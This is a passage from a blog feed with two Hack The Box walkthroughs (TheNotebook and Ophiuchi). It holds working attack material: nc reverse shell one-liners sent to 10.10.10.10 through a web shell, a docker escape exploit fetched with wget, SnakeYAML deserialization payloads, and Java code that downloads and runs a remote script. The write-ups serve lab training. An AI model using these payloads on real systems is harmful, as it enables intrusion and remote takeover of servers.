      <li>Adding a simple query string at its end, as expected by our simple web shell, to run the id command (<code class="language-plaintext highlighter-rouge">cmd=id</code>) and we could confirm that we have code execution in the server :smiley:</li>
    </ul>

    <p><img src="https://i.imgur.com/eSH3rQY.png" alt="HTB TheNotebook - Simple WebShell" class="align-center" /></p>

    <ul>
      <li>To get a reverse shell, configured a listener and then sent another payload, this time to get a TCP connection from the server, which worked as expected :smile:</li>
    </ul>
  </li>
</ul>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/1e49f8a12603040cc99b2dd39f423b09.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.10.10+4443+&gt;/tmp/f</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.230</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg; uuid=d3f32390-d9e4-4eb0-b1a0-788b54fd8278</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<p>After obtaining the reverse shell, started enumerating the box with the account <code class="language-plaintext highlighter-rouge">www-data</code>, which is the one used by the web server execution. The following items stood out from the others listed during <code class="language-plaintext highlighter-rouge">linpeas.sh</code> execution:</p>

<ul>
  <li>
    <p>Users with console and their permissions</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">noah:x:1000:1000:Noah:/home/noah:/bin/bash</code></li>
      <li><code class="language-plaintext highlighter-rouge">root:x:0:0:root:/root:/bin/bash</code></li>
    </ul>
  </li>
  <li>
    <p>Existence of <code class="language-plaintext highlighter-rouge">/var/backups</code> folder, also mentioned in the previously seen notes.</p>
  </li>
</ul>

<p>As this was previously mentioned, started by inspecting the contents of <code class="language-plaintext highlighter-rouge">/var/backups</code>, where most of the files we couldn’t read except for the <code class="language-plaintext highlighter-rouge">home.tar.gz</code>, which could have some interesting information.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@thenotebook:/var/backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 696
drwxr-xr-x  2 root root     4096 Jun 11 06:26 <span class="nb">.</span>
drwxr-xr-x 14 root root     4096 Feb 12 06:52 ..
<span class="nt">-rw-r--r--</span>  1 root root    51200 Jun 11 06:25 alternatives.tar.0
<span class="nt">-rw-r--r--</span>  1 root root    33252 Feb 24 08:53 apt.extended_states.0
<span class="nt">-rw-r--r--</span>  1 root root     3609 Feb 23 08:58 apt.extended_states.1.gz
<span class="nt">-rw-r--r--</span>  1 root root     3621 Feb 12 06:52 apt.extended_states.2.gz
<span class="nt">-rw-r--r--</span>  1 root root      437 Feb 12 06:17 dpkg.diversions.0
<span class="nt">-rw-r--r--</span>  1 root root      172 Feb 12 06:52 dpkg.statoverride.0
<span class="nt">-rw-r--r--</span>  1 root root   571460 Feb 24 08:53 dpkg.status.0
<span class="nt">-rw-------</span>  1 root root      693 Feb 17 13:18 group.bak
<span class="nt">-rw-------</span>  1 root shadow    575 Feb 17 13:18 gshadow.bak
<span class="nt">-rw-r--r--</span>  1 root root     4373 Feb 17 09:02 home.tar.gz
<span class="nt">-rw-------</span>  1 root root     1555 Feb 12 06:24 passwd.bak
<span class="nt">-rw-------</span>  1 root shadow   1024 Feb 12 07:33 shadow.bak
</code></pre></div></div>

<p>Expanding the archive, noticed that the folder structure was from <code class="language-plaintext highlighter-rouge">noah</code>’s home directory, including some ssh keys that might be useful.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xzvf</span> home.tar.gz
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
</code></pre></div></div>

<p>Using the key found, was able to connect using SSH as noah and retrieve the user flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa noah@10.10.10.230
noah@thenotebook:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>As usual, before giving another try with <code class="language-plaintext highlighter-rouge">linenum.sh</code> with different privileges, ran <code class="language-plaintext highlighter-rouge">sudo -l</code> which returned the following content:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noah@thenotebook:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>noah on thenotebook:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User noah may run the following commands on thenotebook:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01<span class="k">*</span>
</code></pre></div></div>

<p>As we have access to run any command in the docker container with <strong>exec</strong>, began by entering in an interactive shell as the command below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01 bash
</code></pre></div></div>

<p>Inside the container, was able to see the files used while publishing the website, where we can look for sensitive information</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@7228ddf52a0f:/opt/webapp# <span class="nb">ls</span> <span class="nt">-la</span>
total 2244
drwxr-xr-x 1 root root    4096 Jun 11 07:04 <span class="nb">.</span>
drwxr-xr-x 1 root root    4096 Feb 12 07:30 ..
drwxr-xr-x 1 root root    4096 Feb 12 07:30 __pycache__
drwxr-xr-x 3 root root    4096 Nov 18  2020 admin
<span class="nt">-rw-r--r--</span> 1 root root    3303 Nov 16  2020 create_db.py
<span class="nt">-rwxr-xr-x</span> 1 root root 2236814 Jun 11 07:04 main
<span class="nt">-rw-r--r--</span> 1 root root    9517 Feb 11 15:00 main.py
<span class="nt">-rw-------</span> 1 root root    3247 Feb 11 15:09 privKey.key
<span class="nt">-rw-r--r--</span> 1 root root      78 Feb 12 07:12 requirements.txt
drwxr-xr-x 3 root root    4096 Nov 19  2020 static
drwxr-xr-x 2 root root    4096 Nov 18  2020 templates
<span class="nt">-rw-r--r--</span> 1 root root      20 Nov 20  2020 webapp.tar.gz
</code></pre></div></div>

<p>Checking the content of these files, in <code class="language-plaintext highlighter-rouge">create_db.py</code> noticed two password hashes for users <code class="language-plaintext highlighter-rouge">noah</code> and <code class="language-plaintext highlighter-rouge">admin</code>, which I decided to search on the internet first if they have already been cracked.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">users</span> <span class="o">=</span> <span class="p">[</span>
        <span class="nc">User</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span> <span class="n">email</span><span class="o">=</span><span class="sh">'</span><span class="s">admin@thenotebook.local</span><span class="sh">'</span><span class="p">,</span> <span class="n">uuid</span><span class="o">=</span><span class="n">admin_uuid</span><span class="p">,</span> <span class="n">admin_cap</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="sh">"</span><span class="s">0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68</span><span class="sh">"</span><span class="p">),</span>
        <span class="nc">User</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="sh">'</span><span class="s">noah</span><span class="sh">'</span><span class="p">,</span> <span class="n">email</span><span class="o">=</span><span class="sh">'</span><span class="s">noah@thenotebook.local</span><span class="sh">'</span><span class="p">,</span> <span class="n">uuid</span><span class="o">=</span><span class="n">noah_uuid</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="sh">"</span><span class="s">e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2</span><span class="sh">"</span><span class="p">)</span>
    <span class="p">]</span>
</code></pre></div></div>

<p>As haven’t found anything in public sites (Crackstation, for example) this means that these passwords are not present in known wordlists like <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, frequently used in CTFs. Decided to go further enumerating for other vulnerabilities in docker, specifically <em>docker breakout</em>, allowing us to escape to the host.</p>

<p>Searching for some information, found the repo <a href="https://github.com/stealthcopter/deepce">stealthcopter/deepce: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) (github.com)</a> where there’s a script that can help us enumerate the container characteristics known to be helpful in this kind of situation.</p>

<p>Executing it in the container, noticed that we could have a chance on doing it as there were capabilities (in red) that could allow us to read and write files in the host, but using the options in the tool didn’t allow me to achieve the expected outcome.</p>

<p><img src="https://i.imgur.com/0L7480D.png" alt="HTB TheNotebook - deepce output" class="align-center" /></p>

<p>As I haven’t found anything in the files, decided to search for specific vulnerabilities that could abuse capabilities like the ones we have found, where I found about CVE-2019-5736 while browsing for docker vulns in <a href="https://www.cvedetails.com/">CVE Details</a>. This vuln represents exactly the type of abuse we need based on our situation and, due to its high CVSS score (9.3) probably there is a ready exploit to be used.</p>

<p><img src="https://i.imgur.com/CqvPKK3.png" alt="CVE Details - CVE-2019-5736" class="align-center" /></p>

<p>Searching for exploits I came across the repo <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">Frichetten/CVE-2019-5736-PoC: PoC for CVE-2019-5736 (github.com)</a> which had a PoC written in Golang that supposedly would attend to our scenario, while other PoCs found required us to be able to run other containers (<code class="language-plaintext highlighter-rouge">docker run</code>) in the host, not covered by our sudo privileges.</p>

<p>To obtain the root shell, the following steps were executed, as also seen in this blog post (<a href="https://www.programmersought.com/article/71804432772/">Reproduction of docker escape vulnerability (CVE-2019-5736) - Programmer Sought</a>)</p>

<ul>
  <li>
    <p>Downloaded and edited the script <code class="language-plaintext highlighter-rouge">escape.go</code> to give us a reverse shell.</p>
  </li>
  <li>
    <p>Compiled it using the parameters below</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">CGO_ENABLED</span><span class="o">=</span>0 <span class="nv">GOOS</span><span class="o">=</span>linux <span class="nv">GOARCH</span><span class="o">=</span>amd64 go build escape.go
</code></pre></div></div>

<ul>
  <li>Copied the exploit to the victim machine, inside the container, followed by its execution</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.10.10/escape
<span class="nb">chmod</span> +x escape
./escape
</code></pre></div></div>

<ul>
  <li>Once the exploit replaces the file <code class="language-plaintext highlighter-rouge">/bin/sh</code> with the malicious script, execute the command line below to trigger the exploration</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01 /bin/sh
</code></pre></div></div>

<p>After this execution, was received a reverse shell in the listener previously configured and was able to get the root’s flag</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> 8080
listening on <span class="o">[</span>any] 8080 ...
connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.230] 35856
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1617<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
&lt;4de4eaff90e275467ff2103ff7b6eb2b1ffaf63d44f72a2b2# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@thenotebook:/root# <span class="nb">cat </span>root.txt
<span class="se">\c</span>at root.txt
&lt;redacted&gt;
</code></pre></div></div>

<p>I hope you guys have enjoyed it!</p>

<p>See you in the next post :smiley:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Medium" /><category term="HTB Linux" /><summary type="html"><![CDATA[Hello guys! This week’s machine will be TheNotebook, another medium-rated Linux box from Hack The Box, created by mostwanted002.]]></summary></entry><entry><title type="html">Walktrough: HTB Ophiuchi</title><link href="https://davicruz.com/walkthrough/2021/07/htb-ophiuchi" rel="alternate" type="text/html" title="Walktrough: HTB Ophiuchi" /><published>2021-07-03T13:00:00-03:00</published><updated>2021-07-03T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/07/htb-ophiuchi</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/07/htb-ophiuchi"><![CDATA[<p>Hello guys!</p>

<p>This week’s machine will be <strong>Ophiuchi</strong>, another medium-rated box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/27390">felamos</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>

<p><img src="https://i.imgur.com/RgW95kn.png" alt="htb-ophiuchi" class="align-center" /></p>

<p>Recently I have been starting the recon of HTB boxes by searching a little about their names, as it or their images can give some cues on how to pwn them.</p>

<p>Searching <code class="language-plaintext highlighter-rouge">define ophiuchi</code> in Google I was redirected to `define Ophiuchus, which is commonly represented as a man grasping a <strong>snake</strong>, what makes sense once we have a picture of a planet, astronaut, and some stars, but we’ll see that isn’t only that! :smiley:</p>

<h2 id="enumeration">Enumeration</h2>

<p>Starting the enumeration, as usual, running a quick <code class="language-plaintext highlighter-rouge">nmap</code> scan to find the published services.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.227
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-27 17:32 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.227
Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee <span class="o">(</span>RSA<span class="o">)</span>
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 <span class="o">(</span>ED25519<span class="o">)</span>
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.18 seconds
</code></pre></div></div>

<h3 id="8080tcp---tomcat">8080/TCP - Tomcat</h3>

<p>Accessing the Tomcat page at <code class="language-plaintext highlighter-rouge">http://10.10.10.227:8080</code> we see a YAML parser website, as below:</p>

<p><img src="https://i.imgur.com/oDXT0S9.png" alt="Ophiuchi - Parse YAML" class="align-center" /></p>

<p>Sending a simple payload (<code class="language-plaintext highlighter-rouge">teste: true</code>), the following message is returned:</p>

<blockquote>
  <p>Due to security reasons this feature has been temporarily on hold. We will soon fix the issue!</p>
</blockquote>

<p>Once Tomcat is a Java web server, and, based on the message returned, searched about <code class="language-plaintext highlighter-rouge">java yaml rce vulnerability</code> where I’ve found a <a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">Medium post</a> talking about a vuln called <strong>SnakeYAML</strong>, which had a PoC like the website we have. Also, as <em>snake</em> have some references to the constellation from which this box was named, proves we’re on the right path :smile:.</p>

<p>Following the suggestion in the post, started a simple http server using python (<code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code>) and sent the following payload:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!!</span><span class="n">javax</span><span class="o">.</span><span class="na">script</span><span class="o">.</span><span class="na">ScriptEngineManager</span> <span class="o">[</span>
  <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URLClassLoader</span> <span class="o">[[</span>
    <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URL</span> <span class="o">[</span><span class="s">"http://10.10.10.10/"</span><span class="o">]</span>
  <span class="o">]]</span>
<span class="o">]</span>
</code></pre></div></div>

<p>Just like the PoC in the blog post, the server searches for a file in <code class="language-plaintext highlighter-rouge">/META-INF/services/javax.script.ScriptEngineFactory</code> should provide a java class to be executed, which was confirmed based on the logs below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.227 - - <span class="o">[</span>28/Feb/2021 12:19:22] code 404, message File not found
10.10.10.227 - - <span class="o">[</span>28/Feb/2021 12:19:22] <span class="s2">"HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1"</span> 404 -
</code></pre></div></div>

<h2 id="initial-access">Initial access</h2>

<p>To gain initial access to this machine, used the project referenced in the blog post found (<a href="https://github.com/artsploit/yaml-payload">artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads</a>).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/artsploit/yaml-payload.git
</code></pre></div></div>

<p>As recommended, we’ll add our payload in the class named <code class="language-plaintext highlighter-rouge">AwesomeScriptEngineFactory.java</code> compile it and invoke it from the payload sent in the form.</p>

<p>First I have tried to use payload <code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f</code> directly in the class <code class="language-plaintext highlighter-rouge">yaml-payload\src\artsploit\AwesomeScriptEngineFactory.java</code> but as it uses some redirects and pipelines (<code class="language-plaintext highlighter-rouge">&gt;</code> e <code class="language-plaintext highlighter-rouge">|</code>) noticed that the best approach would host a payload file in the webserver, download it and run from the victim machine, as the edit below:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"wget http://10.10.10.10/payload -O /tmp/exploit.sh"</span><span class="o">);</span>
            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"chmod a+x /tmp/exploit.sh"</span><span class="o">);</span>
            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"bash /tmp/exploit.sh"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>After modified, compiled the class and copied to the path where it was being called from:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac src/artsploit/AwesomeScriptEngineFactory.java
jar <span class="nt">-cvf</span> yaml-payload.jar <span class="nt">-C</span> src/ <span class="nb">.</span>
</code></pre></div></div>

<p>After that, as well as copying the payload file to be executed, sent the payload below on the webpage</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!!</span><span class="n">javax</span><span class="o">.</span><span class="na">script</span><span class="o">.</span><span class="na">ScriptEngineManager</span> <span class="o">[</span>
  <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URLClassLoader</span> <span class="o">[[</span>
    <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URL</span> <span class="o">[</span><span class="s">"http://10.10.10.10/yaml-payload.jar"</span><span class="o">]</span>
  <span class="o">]]</span>
<span class="o">]</span>
</code></pre></div></div>

<p>And voilá! We got a reverse shell in the box! :smile:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0<span class="nv">$ </span><span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">id
</span>ophiuchi
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>tomcat<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>tomcat<span class="o">)</span>
bash-5.0<span class="err">$</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<p>Started the enumeration, as usual, using <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, where I could identify the following points:</p>

<ul>
  <li>Tomcat service running with its specific account, allowing us to read the app files and logs</li>
  <li>Enumerating the users in this box, found <strong>admin</strong>, the only one with console access (besides root).</li>
</ul>

<p>With this information, verified the creds for Tomcat from <code class="language-plaintext highlighter-rouge">/opt/tomcat/conf/tomcat-users.xml</code> file, where the password <strong>whythereisalimit</strong> was found.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">"admin"</span> <span class="na">password=</span><span class="s">"whythereisalimit"</span> <span class="na">roles=</span><span class="s">"manager-gui,admin-gui"</span><span class="nt">/&gt;</span>
</code></pre></div></div>

<p>Testing it for the user admin, we have confirmed that it was valid.</p>

<p><img src="https://i.imgur.com/x7m50Ah.png" alt="Ophiuchi - Tomcat Manager" class="align-center" /></p>

<p>Once we have a Linux user with the same name <code class="language-plaintext highlighter-rouge">admin</code>, once tried to reuse the same creds using ssh, I was successful in logging in, obtaining the user’s flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Last login: Sun Apr 18 01:22:24 2021 from 10.10.10.10
<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">id
</span>ophiuchi
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span>
<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">cat </span>user.txt 
&lt;redacted&gt;
<span class="nt">-bash-5</span>.0<span class="err">$</span>
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>Besides always give <code class="language-plaintext highlighter-rouge">linpeas.sh</code> another try, once we have the password for the user I like to check if the user can run anything with root privileges, where in this case we were lucky and got the following output:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>admin on ophiuchi:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User admin may run the following commands on ophiuchi:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
</code></pre></div></div>

<p>Inspecting the file <code class="language-plaintext highlighter-rouge">/opt/wasm-functions/index.go</code> we have the following content:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
        <span class="s">"fmt"</span>
        <span class="n">wasm</span> <span class="s">"github.com/wasmerio/wasmer-go/wasmer"</span>
        <span class="s">"os/exec"</span>
        <span class="s">"log"</span>
<span class="p">)</span>


<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">bytes</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">ReadBytes</span><span class="p">(</span><span class="s">"main.wasm"</span><span class="p">)</span>

        <span class="n">instance</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">NewInstance</span><span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
        <span class="k">defer</span> <span class="n">instance</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
        <span class="n">init</span> <span class="o">:=</span> <span class="n">instance</span><span class="o">.</span><span class="n">Exports</span><span class="p">[</span><span class="s">"info"</span><span class="p">]</span>
        <span class="n">result</span><span class="p">,</span><span class="n">_</span> <span class="o">:=</span> <span class="n">init</span><span class="p">()</span>
        <span class="n">f</span> <span class="o">:=</span> <span class="n">result</span><span class="o">.</span><span class="n">String</span><span class="p">()</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">!=</span> <span class="s">"1"</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Not ready to deploy"</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Ready to deploy"</span><span class="p">)</span>
                <span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"deploy.sh"</span><span class="p">)</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span>
                <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
                <span class="p">}</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>As we can see, this is a Go Lang script that loads its variables from <code class="language-plaintext highlighter-rouge">main.wasm</code> and, if the value <code class="language-plaintext highlighter-rouge">f</code> under property <code class="language-plaintext highlighter-rouge">info</code> is equal to <strong>1</strong>, the file <code class="language-plaintext highlighter-rouge">deploy.sh</code> is executed.</p>

